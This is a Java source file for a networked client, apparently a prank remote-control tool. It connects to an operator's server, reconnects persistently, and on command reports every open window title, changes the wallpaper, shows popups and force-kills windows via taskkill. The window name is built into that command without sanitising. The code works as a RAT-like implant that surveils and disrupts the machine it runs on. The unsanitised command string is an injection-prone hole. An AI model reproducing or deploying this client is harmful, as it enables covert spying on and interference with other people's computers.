package me.toast.weeb;

import com.esotericsoftware.kryonet.Client;
import com.esotericsoftware.kryonet.Connection;
import com.esotericsoftware.kryonet.Listener;
import javafx.application.Application;
import javafx.application.Platform;

import java.io.File;
import java.io.IOException;
import java.util.List;

public class Main {

    public static Client CLIENT;
    public static String SERVER_IP;

    public static Listener LISTENER = new Listener() {
        public void disconnected(Connection connection) {
            while (!CLIENT.isConnected()) {
                try {
                    CLIENT.reconnect();
                    if (CLIENT.isConnected())
                        break;
                } catch (IOException e) {
                    System.err.println("Couldn't connect retrying in 1 minute...");
                    SleepFor1Minute();
                }
            }
        }
        public void received(Connection connection, Object object) {
            if (object instanceof Packets.OpenWindowsRequest) {
                System.out.println("Got Window Request!");

                Packets.OpenWindowsStartResponse startResponse = new Packets.OpenWindowsStartResponse();
                connection.sendTCP(startResponse);

                List<String> listOfWindows = RunningPrograms.getAllWindowNames();
                for (int i = 0; i < listOfWindows.size(); i++) {
                    Packets.OpenWindowsResponse response = new Packets.OpenWindowsResponse();
                    response.openWindow = listOfWindows.get(i);
                    connection.sendTCP(response);
                }
                Packets.OpenWindowsFinalResponse last = new Packets.OpenWindowsFinalResponse();
                connection.sendTCP(last);
            }
            if (object instanceof Packets.ChangeBackground) {
                System.out.println("Got Change Background Request!");
                WallpaperChanger.Change(new File("./assets/weeb.jpg").getAbsolutePath());
            }
            if (object instanceof Packets.TriggerPopup) {
                System.out.println("Got a Trigger Popup Request!");
                Platform.runLater(() -> WeebPopup.stage.show());
            }
            if (object instanceof Packets.CloseWindow request) {
                System.out.println("Got Close Window Request for: " + request.nameOfWindow);
                Runtime rt = Runtime.getRuntime();

                try {
                    rt.exec("taskkill /F /FI \"WINDOWTITLE eq "+ request.nameOfWindow + "\"");
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    };

    public static void main(String[] args) {
        if (args[0] == null) {
            System.err.println("No server IP set for first argument");
            System.exit(1);
        }
        SERVER_IP = args[0];
        Thread.currentThread().setName("Main");

        new Thread(() -> Application.launch(WeebPopup.class), "Popup").start();
        Platform.setImplicitExit(false);

        CLIENT = new Client();
        Packets.RegisterPackets(CLIENT.getKryo());
        Thread thread = new Thread(CLIENT, "Networking"); thread.start();

        while (!CLIENT.isConnected()) {
            try {
                CLIENT.connect(5000, SERVER_IP, 54555);
                if (CLIENT.isConnected())
                    break;
            } catch (IOException e) { System.err.println("Couldn't connect retrying in 1 minute..."); SleepFor1Minute(); }
        }

        CLIENT.addListener(LISTENER);
    }

    public static void SleepFor1Minute() {
        try {
            Thread.sleep(60000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
